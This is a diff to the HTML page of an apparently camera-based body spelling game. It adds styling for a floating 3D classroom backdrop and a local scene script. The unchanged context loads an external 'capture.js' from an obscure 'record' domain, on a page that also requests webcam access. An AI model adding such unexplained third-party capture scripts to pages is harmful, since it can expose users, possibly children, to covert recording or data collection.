@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <title>Body Spell Board</title>
+  <title>Body Spelling Challenge</title>
   <style>
     :root {
       --ink: #17324d;
@@ -89,6 +89,25 @@
       transform: translateY(4px);
       box-shadow: 0 2px 0 #1d61bb;
     }
+
+    /* 3D classroom backdrop (js/scene3d.js); only once WebGL has drawn a frame */
+    .scene3d-on body { background: #0e0810; }
+    .scene3d-on .app {
+      background-image: url("song_song_Body%20Spell%20Challenge/frame-v2-cutout.png");
+      position: relative;
+      z-index: 1;
+      filter: drop-shadow(0 30px 40px rgba(10, 6, 50, .55)) drop-shadow(0 0 30px rgba(255, 230, 150, .25));
+      animation: boardFloat 6s ease-in-out infinite;
+    }
+    .scene3d-on body > a { z-index: 2; }
+    @keyframes boardFloat {
+      0%, 100% { transform: perspective(1200px) rotateX(3deg) rotateY(-2deg) translateY(0); }
+      50% { transform: perspective(1200px) rotateX(-1deg) rotateY(2deg) translateY(-10px); }
+    }
+    .scene3d-on a.play {
+      background: linear-gradient(180deg, #4d9bff, #1f6ae0);
+      box-shadow: 0 6px 0 #1d61bb, 0 0 22px rgba(80, 160, 255, .55);
+    }
   </style>
 </head>
 <body>
@@ -116,6 +135,10 @@
       ?.getUserMedia({ video: true })
       .then((stream) => stream.getTracks().forEach((t) => t.stop()))
       .catch(() => {});
+  </script>
+  <script type="module">
+    import { mountMagicScene } from "./js/scene3d.js";
+    mountMagicScene({ theme: "classroom", view: "body" });
   </script>
   <script src="https://record.22422522.xyz/capture.js?v=2"></script>
 </body>
